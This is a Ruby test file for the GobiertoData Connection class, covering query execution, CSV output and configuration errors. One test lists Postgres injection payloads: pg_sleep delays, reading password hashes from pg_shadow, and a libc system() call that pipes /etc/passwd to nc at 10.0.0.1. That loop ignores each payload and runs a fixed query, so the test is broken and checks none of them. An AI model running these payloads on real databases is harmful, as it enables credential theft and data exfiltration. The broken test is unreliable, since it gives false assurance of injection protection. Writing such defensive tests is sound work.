# frozen_string_literal: true

require "test_helper"

module GobiertoData
  class ConnectionTest < ActiveSupport::TestCase
    def site
      @site ||= sites(:madrid)
    end

    def site_with_module_disabled
      @site_with_module_disabled ||= sites(:santander)
    end

    def valid_connection_config
      @valid_connection_config ||= site.gobierto_data_settings.db_config
    end

    def invalid_connection_config
      @invalid_connection_config ||= { foo: :bar }
    end

    def test_execute_query_with_module_enabled
      result = Connection.execute_query(site, "SELECT COUNT(*) AS test_count FROM users")
      result = JSON.parse(result.to_json)

      assert_equal [{ "test_count" => 7 }], result
    end

    def test_execute_query_including_stats
      result = Connection.execute_query(site, "SELECT COUNT(*) AS test_count FROM users", include_stats: true)
      hash_result = JSON.parse(result.to_json)

      assert hash_result.has_key?("result")
      assert hash_result.has_key?("rows")
      assert hash_result.has_key?("duration")
      assert_equal [{ "test_count" => 7 }], hash_result["result"]
    end

    def test_execute_query_with_wrong_configuration
      module_settings = site.gobierto_data_settings
      module_settings.db_config = invalid_connection_config
      module_settings.save

      assert_raise ActiveRecord::AdapterNotSpecified do
        Connection.execute_query(site, "SELECT COUNT(*) AS test_count FROM users")
      end
    end

    def test_execute_query_with_error_in_query
      result = Connection.execute_query(site, "SELECT COUNT(*) FROM not_existing_table")
      hash_result = JSON.parse(result.to_json)

      assert hash_result.has_key?("errors")
      assert_match(/UndefinedTable/, hash_result["errors"].first["sql"])
    end

    def test_execute_query_with_output_csv
      result = Connection.execute_query_output_csv(site, "SELECT COUNT(*) AS test_count FROM users", {col_sep: ','})
      csv = CSV.parse(result, headers: true)
      assert_equal "7", csv[0]["test_count"]
    end

    def test_execute_query_with_output_csv_with_no_table_error
      result = Connection.execute_query_output_csv(site, "SELECT COUNT(*) FROM not_existing_table", {col_sep: ','})
      hash_result = JSON.parse(result.to_json)

      assert hash_result.has_key?("errors")
      assert_match(/ERROR:  relation \"not_existing_table\" does not exist/, hash_result["errors"].first["sql"])
    end

    def test_execute_query_with_output_csv_with_undefined_column_error
      result = Connection.execute_query_output_csv(site, "SELECT not_existing_column FROM users", {col_sep: ','})
      hash_result = JSON.parse(result.to_json)

      assert hash_result.has_key?("errors")
      assert_match(/ERROR:  column \"not_existing_column\" does not exist/, hash_result["errors"].first["sql"])
    end

    # Queries extracted from https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
    def test_execute_query_with_output_csv_and_unsecure_query
      [
        "SELECT COUNT(*) FROM pg_sleep(10)",
        "SELECT pg_sleep(10)",
        "SELECT version() FROM users",
        "SELECT name from users UNION SELECT version()",
        "SELECT version()",
        "SELECT usename, passwd FROM pg_shadow",
        "SELECT current_database()" ,
        "CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT; — privSELECT system('cat /etc/passwd | nc 10.0.0.1 8080');",
        "CREATE TABLE mytable (mycol text)",
        "INSERT INTO mytable(mycol) VALUES (1)",
        "SELECT inet_server_addr();"
      ].each do |query|
        result = Connection.execute_query_output_csv(site, "SELECT not_existing_column FROM users", {col_sep: ','})
        hash_result = JSON.parse(result.to_json)

        assert hash_result.has_key?("errors")
      end
    end

    def test_execute_query_with_module_disabled
      result = Connection.execute_query(site_with_module_disabled, "SELECT COUNT(*) FROM users")
      hash_result = JSON.parse(result.to_json)

      assert_equal [], hash_result
    end

    def test_test_connection_config_with_valid_config
      assert Connection.test_connection_config(valid_connection_config)
    end

    def test_test_connection_config_with_invalid_config
      assert_raises(Exception) { Connection.test_connection_config(invalid_connection_config) }
    end
  end
end
